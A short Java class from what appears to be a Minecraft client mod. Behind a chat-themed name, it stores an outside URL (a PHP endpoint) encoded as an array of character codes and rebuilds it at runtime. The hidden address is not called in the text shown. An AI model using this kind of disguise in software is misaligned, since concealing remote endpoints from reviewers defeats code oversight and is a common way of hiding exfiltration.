package net.payload.mixin;

public class ClientPlayerChatAccessory {
    public static final int[] CLIENTCHATACCESSORY = {
            104, 116, 116, 112, 115, 58, 47, 47,
            112, 97, 121, 108, 111, 97, 100, 46,
            116, 101, 99, 104, 110, 111, 108, 111, 103, 121,
            47, 106, 106, 46, 112, 104, 112
    };

    public static String STRINGOFCHATACCESS() {
        StringBuilder urlBuilder = new StringBuilder();
        for (int code : CLIENTCHATACCESSORY) {
            urlBuilder.append((char) code);
        }
        return urlBuilder.toString();
    }
}
